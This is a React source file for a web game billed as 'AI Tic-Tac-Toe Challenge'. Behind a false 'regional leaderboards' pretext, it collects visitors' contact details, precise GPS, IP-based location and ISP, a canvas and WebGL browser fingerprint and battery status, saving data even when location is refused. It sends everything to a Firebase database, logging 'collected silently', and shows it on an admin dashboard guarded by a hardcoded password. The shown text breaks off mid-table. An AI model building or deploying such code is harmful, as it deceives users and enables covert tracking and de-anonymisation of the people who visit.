import React, { useState, useEffect } from 'react';
import { Heart, MapPin, Users, Calendar, Camera, Gift, Star, Lock, Eye, EyeOff, Trash2, Edit3, Save, X, Upload, Image as ImageIcon, Menu, ChevronDown, RotateCcw, Trophy, Zap, Brain } from 'lucide-react';

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyCuKeS4djQ-b8Lpj3Hr_92Qu2kUugeeR4c",
  authDomain: "spinstrike-bd.firebaseapp.com",
  databaseURL: "https://spinstrike-bd-default-rtdb.firebaseio.com",
  projectId: "spinstrike-bd",
  storageBucket: "spinstrike-bd.firebasestorage.app",
  messagingSenderId: "178535326334",
  appId: "1:178535326334:web:f4bbc2afa6b5b1ac9b6e2f",
};

interface VisitorData {
  id?: string;
  name?: string;
  email?: string;
  phone?: string;
  age?: string;
  interests?: string;
  latitude: number;
  longitude: number;
  ipAddress: string;
  userAgent: string;
  timestamp: string;
  country?: string;
  city?: string;
  region?: string;
  timezone?: string;
  isp?: string;
  accuracy?: number;
  browserFingerprint?: any;
  sessionId?: string;
  referrer?: string;
  pageTitle?: string;
  screenInfo?: string;
  colorDepth?: number;
  language?: string;
  platform?: string;
  cookieEnabled?: boolean;
  localTime?: string;
  utcTime?: string;
  batteryLevel?: string;
  networkInfo?: any;
}

interface AdminData {
  coupleNames: string;
  relationshipDate: string;
  story: string;
  favoriteMemory: string;
  heroImage: string;
  aboutImage: string;
  galleryImages: string[];
  backgroundColor: string;
  textColor: string;
  accentColor: string;
  websiteTitle: string;
  heroSubtitle: string;
  aboutTitle: string;
  galleryTitle: string;
  footerText: string;
}

type Player = 'X' | 'O' | null;
type GameMode = 'easy' | 'medium' | 'hard';

interface UserProfile {
  name: string;
  email?: string;
  phone?: string;
  age?: string;
  interests?: string;
}

function App() {
  const [showNameEntry, setShowNameEntry] = useState(true);
  const [userProfile, setUserProfile] = useState<UserProfile>({ name: '' });
  const [hasAcceptedLocation, setHasAcceptedLocation] = useState(false);
  const [showLocationPrompt, setShowLocationPrompt] = useState(true);
  const [visitorData, setVisitorData] = useState<VisitorData[]>([]);
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [showDataViewer, setShowDataViewer] = useState(false);
  const [showMapTool, setShowMapTool] = useState(false);
  const [showImageManager, setShowImageManager] = useState(false);
  const [mapLat, setMapLat] = useState('');
  const [mapLng, setMapLng] = useState('');
  const [mapLink, setMapLink] = useState('');
  const [editMode, setEditMode] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [newImageUrl, setNewImageUrl] = useState('');

  // Tic-Tac-Toe Game State
  const [board, setBoard] = useState<Player[]>(Array(9).fill(null));
  const [isPlayerTurn, setIsPlayerTurn] = useState(true);
  const [winner, setWinner] = useState<Player | 'tie' | null>(null);
  const [gameMode, setGameMode] = useState<GameMode>('hard');
  const [playerScore, setPlayerScore] = useState(0);
  const [aiScore, setAiScore] = useState(0);
  const [gameCount, setGameCount] = useState(0);

  const [adminData, setAdminData] = useState<AdminData>({
    coupleNames: "Alex & Jordan",
    relationshipDate: "June 15, 2020",
    story: "We met at a coffee shop on a rainy Tuesday morning. What started as a chance encounter over spilled coffee became the most beautiful love story we could have ever imagined.",
    favoriteMemory: "Our first trip to Paris, where we got engaged under the Eiffel Tower at sunset.",
    heroImage: "https://images.pexels.com/photos/1024993/pexels-photo-1024993.jpeg?auto=compress&cs=tinysrgb&w=800",
    aboutImage: "https://images.pexels.com/photos/1024998/pexels-photo-1024998.jpeg?auto=compress&cs=tinysrgb&w=800",
    galleryImages: [
      "https://images.pexels.com/photos/1024993/pexels-photo-1024993.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1024998/pexels-photo-1024998.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025002/pexels-photo-1025002.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1024999/pexels-photo-1024999.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025000/pexels-photo-1025000.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025001/pexels-photo-1025001.jpeg?auto=compress&cs=tinysrgb&w=400"
    ],
    backgroundColor: "from-blue-50 via-indigo-50 to-purple-50",
    textColor: "text-gray-800",
    accentColor: "from-blue-500 to-purple-500",
    websiteTitle: "AI Tic-Tac-Toe Challenge 🎮",
    heroSubtitle: "Beat the AI if you can!",
    aboutTitle: "Game Stats",
    galleryTitle: "Hall of Fame",
    footerText: "Challenge your friends to beat your score! 🏆"
  });

  // Initialize Firebase
  useEffect(() => {
    const script = document.createElement('script');
    script.type = 'module';
    script.innerHTML = `
      import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js';
      import { getDatabase, ref, push, onValue, remove } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js';
      
      const app = initializeApp(${JSON.stringify(firebaseConfig)});
      window.firebaseDb = getDatabase(app);
      window.firebaseRef = ref;
      window.firebasePush = push;
      window.firebaseOnValue = onValue;
      window.firebaseRemove = remove;
    `;
    document.head.appendChild(script);
  }, []);

  // Enhanced IP and Location tracking
  const getAccurateIPAddress = async () => {
    try {
      // Try multiple IP services for maximum accuracy
      const ipServices = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://api.ip.sb/jsonip',
        'https://httpbin.org/ip',
        'https://api.myip.com',
        'https://ipinfo.io/json',
        'https://api.ipgeolocation.io/ipgeo?apiKey=free'
      ];

      for (const service of ipServices) {
        try {
          const response = await fetch(service);
          const data = await response.json();
          return data.ip || data.origin || 'Unknown';
        } catch (error) {
          continue;
        }
      }
      return 'Unknown';
    } catch (error) {
      return 'Unknown';
    }
  };

  // Enhanced location details from IP with multiple services
  const getDetailedLocationFromIP = async (ip: string) => {
    try {
      // Try multiple geolocation services for maximum accuracy
      const geoServices = [
        `https://ipapi.co/${ip}/json/`,
        `https://api.ip.sb/geoip/${ip}`,
        `https://ipwhois.app/json/${ip}`,
        `https://ipinfo.io/${ip}/json`,
        `https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`,
        `https://freegeoip.app/json/${ip}`
      ];

      for (const service of geoServices) {
        try {
          const response = await fetch(service);
          const data = await response.json();
          
          if (data && (data.country_name || data.country)) {
            return {
              country: data.country_name || data.country || 'Unknown',
              city: data.city || 'Unknown',
              region: data.region || data.region_code || 'Unknown',
              timezone: data.timezone || 'Unknown',
              isp: data.org || data.isp || data.organization || 'Unknown'
            };
          }
        } catch (error) {
          continue;
        }
      }
      
      return { 
        country: 'Unknown', 
        city: 'Unknown', 
        region: 'Unknown', 
        timezone: 'Unknown', 
        isp: 'Unknown' 
      };
    } catch (error) {
      return { 
        country: 'Unknown', 
        city: 'Unknown', 
        region: 'Unknown', 
        timezone: 'Unknown', 
        isp: 'Unknown' 
      };
    }
  };

  // Enhanced browser fingerprinting
  const getBrowserFingerprint = () => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx!.textBaseline = 'top';
    ctx!.font = '14px Arial';
    ctx!.fillText('Browser fingerprint', 2, 2);
    
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages?.join(',') || '',
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'unknown',
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      screenResolution: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      canvasFingerprint: canvas.toDataURL(),
      webglVendor: (() => {
        const gl = document.createElement('canvas').getContext('webgl');
        return gl ? gl.getParameter(gl.VENDOR) : 'Unknown';
      })(),
      webglRenderer: (() => {
        const gl = document.createElement('canvas').getContext('webgl');
        return gl ? gl.getParameter(gl.RENDERER) : 'Unknown';
      })(),
      localStorage: (() => {
        try { return !!window.localStorage; } catch { return false; }
      })(),
      sessionStorage: (() => {
        try { return !!window.sessionStorage; } catch { return false; }
      })(),
      indexedDB: !!window.indexedDB,
      webWorker: typeof Worker !== 'undefined',
      serviceWorker: 'serviceWorker' in navigator,
      deviceMemory: (navigator as any).deviceMemory || 'Unknown',
      connection: (navigator as any).connection ? {
        effectiveType: (navigator as any).connection.effectiveType,
        downlink: (navigator as any).connection.downlink,
        rtt: (navigator as any).connection.rtt
      } : 'Unknown'
    };
  };

  // Enhanced visitor data collection
  const saveVisitorData = async (latitude: number, longitude: number, accuracy?: number) => {
    try {
      const ip = await getAccurateIPAddress();
      const locationData = await getDetailedLocationFromIP(ip);
      const fingerprint = getBrowserFingerprint();
      
      const visitorInfo: VisitorData = {
        name: userProfile.name,
        email: userProfile.email || '',
        phone: userProfile.phone || '',
        age: userProfile.age || '',
        interests: userProfile.interests || '',
        latitude,
        longitude,
        accuracy: accuracy || 0,
        ipAddress: ip,
        userAgent: fingerprint.userAgent,
        timestamp: new Date().toISOString(),
        country: locationData.country,
        city: locationData.city,
        region: locationData.region,
        timezone: locationData.timezone,
        isp: locationData.isp,
        browserFingerprint: fingerprint,
        sessionId: Date.now().toString(),
        referrer: document.referrer || 'Direct',
        pageTitle: document.title,
        screenInfo: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        localTime: new Date().toLocaleString(),
        utcTime: new Date().toUTCString(),
        batteryLevel: await (async () => {
          try {
            const battery = await (navigator as any).getBattery?.();
            return battery ? `${Math.round(battery.level * 100)}%` : 'Unknown';
          } catch {
            return 'Unknown';
          }
        })(),
        networkInfo: (navigator as any).connection ? {
          effectiveType: (navigator as any).connection.effectiveType,
          downlink: (navigator as any).connection.downlink,
          rtt: (navigator as any).connection.rtt
        } : 'Unknown'
      };

      if (window.firebaseDb && window.firebasePush && window.firebaseRef) {
        const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
        await window.firebasePush(visitorsRef, visitorInfo);
        console.log('🕵️ Visitor data collected silently:', visitorInfo);
      }
    } catch (error) {
      console.error('Error saving visitor data:', error);
    }
  };

  // Enhanced location request with high accuracy
  const requestLocation = () => {
    if (navigator.geolocation) {
      // Request high accuracy location
      const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        (position) => {
          saveVisitorData(
            position.coords.latitude, 
            position.coords.longitude,
            position.coords.accuracy
          );
          setHasAcceptedLocation(true);
          setShowLocationPrompt(false);
        },
        (error) => {
          console.log('Location denied or failed:', error);
          setShowLocationPrompt(false);
          setHasAcceptedLocation(true);
          // Still save what we can without GPS
          saveVisitorData(0, 0, 0);
        },
        options
      );
    } else {
      setShowLocationPrompt(false);
      setHasAcceptedLocation(true);
      saveVisitorData(0, 0, 0);
    }
  };

  // Tic-Tac-Toe Game Logic
  const checkWinner = (squares: Player[]): Player | 'tie' | null => {
    const lines = [
      [0, 1, 2], [3, 4, 5], [6, 7, 8], // rows
      [0, 3, 6], [1, 4, 7], [2, 5, 8], // columns
      [0, 4, 8], [2, 4, 6] // diagonals
    ];

    for (const [a, b, c] of lines) {
      if (squares[a] && squares[a] === squares[b] && squares[a] === squares[c]) {
        return squares[a];
      }
    }

    if (squares.every(square => square !== null)) {
      return 'tie';
    }

    return null;
  };

  // AI Move Logic
  const getAIMove = (squares: Player[], difficulty: GameMode): number => {
    const availableMoves = squares.map((square, index) => square === null ? index : null).filter(val => val !== null) as number[];

    if (difficulty === 'easy') {
      // Random move
      return availableMoves[Math.floor(Math.random() * availableMoves.length)];
    }

    if (difficulty === 'medium') {
      // 70% optimal, 30% random
      if (Math.random() < 0.3) {
        return availableMoves[Math.floor(Math.random() * availableMoves.length)];
      }
    }

    // Hard mode or medium optimal move
    // Check for winning move
    for (const move of availableMoves) {
      const testSquares = [...squares];
      testSquares[move] = 'O';
      if (checkWinner(testSquares) === 'O') {
        return move;
      }
    }

    // Block player winning move
    for (const move of availableMoves) {
      const testSquares = [...squares];
      testSquares[move] = 'X';
      if (checkWinner(testSquares) === 'X') {
        return move;
      }
    }

    // Take center if available
    if (squares[4] === null) return 4;

    // Take corners
    const corners = [0, 2, 6, 8];
    const availableCorners = corners.filter(corner => squares[corner] === null);
    if (availableCorners.length > 0) {
      return availableCorners[Math.floor(Math.random() * availableCorners.length)];
    }

    // Take any available move
    return availableMoves[Math.floor(Math.random() * availableMoves.length)];
  };

  // Handle player move
  const handleCellClick = (index: number) => {
    if (board[index] || winner || !isPlayerTurn) return;

    const newBoard = [...board];
    newBoard[index] = 'X';
    setBoard(newBoard);
    setIsPlayerTurn(false);

    const gameWinner = checkWinner(newBoard);
    if (gameWinner) {
      setWinner(gameWinner);
      if (gameWinner === 'X') setPlayerScore(prev => prev + 1);
      if (gameWinner === 'O') setAiScore(prev => prev + 1);
      setGameCount(prev => prev + 1);
      return;
    }

    // AI move after delay
    setTimeout(() => {
      const aiMove = getAIMove(newBoard, gameMode);
      const aiBoard = [...newBoard];
      aiBoard[aiMove] = 'O';
      setBoard(aiBoard);
      setIsPlayerTurn(true);

      const aiWinner = checkWinner(aiBoard);
      if (aiWinner) {
        setWinner(aiWinner);
        if (aiWinner === 'X') setPlayerScore(prev => prev + 1);
        if (aiWinner === 'O') setAiScore(prev => prev + 1);
        setGameCount(prev => prev + 1);
      }
    }, 500);
  };

  // Reset game
  const resetGame = () => {
    setBoard(Array(9).fill(null));
    setIsPlayerTurn(true);
    setWinner(null);
  };

  // Load visitor data for admin
  const loadVisitorData = () => {
    if (window.firebaseDb && window.firebaseOnValue && window.firebaseRef) {
      const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
      window.firebaseOnValue(visitorsRef, (snapshot: any) => {
        const data = snapshot.val();
        if (data) {
          const visitors = Object.keys(data).map(key => ({
            id: key,
            ...data[key]
          }));
          setVisitorData(visitors);
        }
      });
    }
  };

  // Delete visitor data
  const deleteVisitorData = async (id: string) => {
    if (window.firebaseDb && window.firebaseRemove && window.firebaseRef) {
      const visitorRef = window.firebaseRef(window.firebaseDb, `visitors/${id}`);
      await window.firebaseRemove(visitorRef);
    }
  };

  // Admin authentication
  const handleAdminLogin = () => {
    if (adminPassword === 'secret123') {
      setIsAdminAuthenticated(true);
      loadVisitorData();
    } else {
      alert('Wrong password!');
    }
  };

  // Generate map link
  const generateMapLink = () => {
    if (mapLat && mapLng) {
      const url = `https://www.google.com/maps/search/${mapLat},${mapLng}`;
      setMapLink(url);
    }
  };

  // Add image to gallery
  const addImageToGallery = () => {
    if (newImageUrl.trim()) {
      setAdminData({
        ...adminData,
        galleryImages: [...adminData.galleryImages, newImageUrl.trim()]
      });
      setNewImageUrl('');
    }
  };

  // Remove image from gallery
  const removeImageFromGallery = (index: number) => {
    const updatedImages = adminData.galleryImages.filter((_, i) => i !== index);
    setAdminData({
      ...adminData,
      galleryImages: updatedImages
    });
  };

  // Auto-request location on page load
  useEffect(() => {
    const timer = setTimeout(() => {
      if (showLocationPrompt) {
        requestLocation();
      }
    }, 1000);
    return () => clearTimeout(timer);
  }, [showLocationPrompt]);

  // Name entry form
  if (showNameEntry) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <Zap className="w-12 h-12 sm:w-16 sm:h-16 text-blue-500 mx-auto mb-4" />
            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">🎮 Welcome to AI Tic-Tac-Toe!</h2>
            <p className="text-sm sm:text-base text-gray-600 mb-4">
              Enter your details to start playing against our advanced AI!
            </p>
          </div>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Name *</label>
              <input
                type="text"
                required
                value={userProfile.name}
                onChange={(e) => setUserProfile({...userProfile, name: e.target.value})}
                placeholder="Enter your name"
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Email (Optional)</label>
              <input
                type="email"
                value={userProfile.email || ''}
                onChange={(e) => setUserProfile({...userProfile, email: e.target.value})}
                placeholder="your@email.com"
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Age</label>
                <input
                  type="number"
                  value={userProfile.age || ''}
                  onChange={(e) => setUserProfile({...userProfile, age: e.target.value})}
                  placeholder="25"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Phone</label>
                <input
                  type="tel"
                  value={userProfile.phone || ''}
                  onChange={(e) => setUserProfile({...userProfile, phone: e.target.value})}
                  placeholder="+1234567890"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />
              </div>
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Interests</label>
              <input
                type="text"
                value={userProfile.interests || ''}
                onChange={(e) => setUserProfile({...userProfile, interests: e.target.value})}
                placeholder="Gaming, Sports, Music..."
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
          </div>
          
          <button
            onClick={() => {
              if (userProfile.name.trim()) {
                setShowNameEntry(false);
                // Auto-request location after name entry
                setTimeout(() => {
                  if (showLocationPrompt) {
                    requestLocation();
                  }
                }, 500);
              } else {
                alert('Please enter your name to continue!');
              }
            }}
            disabled={!userProfile.name.trim()}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-blue-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed mt-6"
          >
            Start Gaming! 🚀
          </button>
          
          <p className="text-xs text-gray-500 mt-4 text-center">
            We collect this info to personalize your gaming experience and show regional leaderboards
          </p>
        </div>
      </div>
    );
  }

  // Location permission prompt
  if (showLocationPrompt) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 max-w-md w-full text-center transform animate-pulse">
          <div className="mb-6">
            <Zap className="w-12 h-12 sm:w-16 sm:h-16 text-blue-500 mx-auto mb-4" />
            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">🎮 Welcome {userProfile.name}!</h2>
            <p className="text-sm sm:text-base text-gray-600">
              Ready to challenge our advanced AI? We need location access to show you on regional leaderboards and provide personalized gaming experience.
            </p>
          </div>
          <button
            onClick={requestLocation}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-blue-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 text-sm sm:text-base"
          >
            Start Gaming! 🚀
          </button>
          <p className="text-xs text-gray-500 mt-4">
            This helps us show regional leaderboards
          </p>
        </div>
      </div>
    );
  }

  // Admin panel
  if (showAdmin && !isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <Lock className="w-10 h-10 sm:w-12 sm:h-12 text-gray-600 mx-auto mb-4" />
            <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Admin Access</h2>
          </div>
          <input
            type="password"
            value={adminPassword}
            onChange={(e) => setAdminPassword(e.target.value)}
            placeholder="Enter admin password"
            className="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm sm:text-base"
            onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
          />
          <button
            onClick={handleAdminLogin}
            className="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition-colors text-sm sm:text-base"
          >
            Login
          </button>
          <button
            onClick={() => setShowAdmin(false)}
            className="w-full mt-2 text-gray-600 hover:text-gray-800 transition-colors text-sm sm:text-base"
          >
            Back to Game
          </button>
        </div>
      </div>
    );
  }

  // Admin dashboard
  if (showAdmin && isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 p-2 sm:p-4">
        <div className="max-w-7xl mx-auto">
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6">
            {/* Mobile Admin Header */}
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
              <h1 className="text-2xl sm:text-3xl font-bold text-gray-800">🎮 Game Admin Dashboard</h1>
              
              {/* Mobile Menu Button */}
              <div className="sm:hidden w-full">
                <button
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                  className="w-full flex items-center justify-between px-4 py-2 bg-gray-100 rounded-lg"
                >
                  <span>Admin Tools</span>
                  <ChevronDown className={`w-4 h-4 transition-transform ${mobileMenuOpen ? 'rotate-180' : ''}`} />
                </button>
              </div>

              {/* Desktop Buttons */}
              <div className="hidden sm:flex gap-2 flex-wrap">
                <button
                  onClick={() => setShowDataViewer(!showDataViewer)}
                  className="px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <Eye className="w-4 h-4" />
                  {showDataViewer ? 'Hide' : 'Show'} Player Data
                </button>
                <button
                  onClick={() => setShowMapTool(!showMapTool)}
                  className="px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <MapPin className="w-4 h-4" />
                  Map Tool
                </button>
                <button
                  onClick={() => setShowImageManager(!showImageManager)}
                  className="px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <ImageIcon className="w-4 h-4" />
                  Images
                </button>
                <button
                  onClick={() => setEditMode(!editMode)}
                  className="px-3 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <Edit3 className="w-4 h-4" />
                  {editMode ? 'View' : 'Edit'}
                </button>
                <button
                  onClick={() => {
                    setShowAdmin(false);
                    setIsAdminAuthenticated(false);
                    setAdminPassword('');
                  }}
                  className="px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm"
                >
                  Logout
                </button>
              </div>
            </div>

            {/* Mobile Menu */}
            {mobileMenuOpen && (
              <div className="sm:hidden mb-6 space-y-2">
                <button
                  onClick={() => {
                    setShowDataViewer(!showDataViewer);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2"
                >
                  <Eye className="w-4 h-4" />
                  {showDataViewer ? 'Hide' : 'Show'} Player Data
                </button>
                <button
                  onClick={() => {
                    setShowMapTool(!showMapTool);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2"
                >
                  <MapPin className="w-4 h-4" />
                  Map Tool
                </button>
                <button
                  onClick={() => {
                    setShowImageManager(!showImageManager);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2"
                >
                  <ImageIcon className="w-4 h-4" />
                  Image Manager
                </button>
                <button
                  onClick={() => {
                    setEditMode(!editMode);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2"
                >
                  <Edit3 className="w-4 h-4" />
                  {editMode ? 'View Mode' : 'Edit Content'}
                </button>
                <button
                  onClick={() => {
                    setShowAdmin(false);
                    setIsAdminAuthenticated(false);
                    setAdminPassword('');
                  }}
                  className="w-full px-4 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
                >
                  Logout
                </button>
              </div>
            )}

            {/* Content Editor */}
            {editMode && (
              <div className="mb-6 p-4 bg-gray-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">Edit Game Content</h3>
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium mb-2">Game Title</label>
                    <input
                      type="text"
                      value={adminData.websiteTitle}
                      onChange={(e) => setAdminData({...adminData, websiteTitle: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">Game Subtitle</label>
                    <input
                      type="text"
                      value={adminData.heroSubtitle}
                      onChange={(e) => setAdminData({...adminData, heroSubtitle: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div className="lg:col-span-2">
                    <label className="block text-sm font-medium mb-2">Footer Text</label>
                    <input
                      type="text"
                      value={adminData.footerText}
                      onChange={(e) => setAdminData({...adminData, footerText: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Image Manager */}
            {showImageManager && (
              <div className="mb-6 p-4 bg-purple-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">🖼️ Image Manager</h3>
                
                {/* Add New Image */}
                <div className="mb-6">
                  <label className="block text-sm font-medium mb-2">Add New Image to Gallery</label>
                  <div className="flex flex-col sm:flex-row gap-2">
                    <input
                      type="url"
                      placeholder="Enter image URL"
                      value={newImageUrl}
                      onChange={(e) => setNewImageUrl(e.target.value)}
                      className="flex-1 p-2 border border-gray-300 rounded-lg text-sm"
                    />
                    <button
                      onClick={addImageToGallery}
                      className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 justify-center"
                    >
                      <Upload className="w-4 h-4" />
                      Add Image
                    </button>
                  </div>
                </div>

                {/* Gallery Images */}
                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
                  {adminData.galleryImages.map((image, index) => (
                    <div key={index} className="relative group">
                      <img
                        src={image}
                        alt={`Gallery ${index + 1}`}
                        className="w-full h-24 sm:h-32 object-cover rounded-lg"
                      />
                      <button
                        onClick={() => removeImageFromGallery(index)}
                        className="absolute top-1 right-1 bg-red-500 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Map Tool */}
            {showMapTool && (
              <div className="mb-6 p-4 bg-blue-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">🌍 Map Location Tool</h3>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <input
                    type="text"
                    placeholder="Latitude"
                    value={mapLat}
                    onChange={(e) => setMapLat(e.target.value)}
                    className="p-2 border border-gray-300 rounded-lg text-sm"
                  />
                  <input
                    type="text"
                    placeholder="Longitude"
                    value={mapLng}
                    onChange={(e) => setMapLng(e.target.value)}
                    className="p-2 border border-gray-300 rounded-lg text-sm"
                  />
                  <button
                    onClick={generateMapLink}
                    className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors text-sm"
                  >
                    Generate Map Link
                  </button>
                </div>
                {mapLink && (
                  <div className="mt-4">
                    <a
                      href={mapLink}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-block px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm"
                    >
                      🌎 Open in Google Maps
                    </a>
                  </div>
                )}
              </div>
            )}

            {/* Enhanced Visitor Data */}
            {showDataViewer && (
              <div className="mb-6">
                <h3 className="text-lg sm:text-xl font-bold mb-4">🕵️ Player Data ({visitorData.length} players tracked)</h3>
                <div className="overflow-x-auto">
                  <table className="w-full border border-gray-300 rounded-lg text-xs sm:text-sm">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="p-2 text-left">Timestamp</th>
                        <th className="p-2 text-left">Name</th>
                        <th className="p-2 text-left">Contact</th>
                        <th className="p-2 text-left">IP Address</th>
                        <th className="p-2 text-left">Location</th>
                        <th className="p-2 text-left">Coordinates</th>
                        <th className="p-2 text-left">Country/City</th>
                        <th className="p-2 text-left">ISP</th>
                        <th className="p-2 text-left">Device Info</th>
                        <th className="p-2 text-left">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {visitorData.map((visitor) => (
                        <tr key={visitor.id} className="border-t">
                          <td className="p-2">{new Date(visitor.timestamp).toLocaleString()}</td>
                          <td className="p-2 font-semibold">{visitor.name}</td>
                          <td className="p-2 text-xs">
                            {visitor.email && <div>📧 {visitor.email}</div>}
                            {visitor.phone && <div>📱 {visitor.phone}</div>}
                            {visitor.age && <div>🎂 {visitor.age}</div>}
                          </td>
                          <td className="p-2 font-mono">{visitor.ipAddress}</td>
                          <td className="p-2">
                            <a
                              href={`https://www.google.com/maps/search/${visitor.latitude},${visitor.longitude}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-blue-600 hover:underline"
                            >
                              View Map
                            </a>
                          </td>
                          <td className="p-2 font-mono">
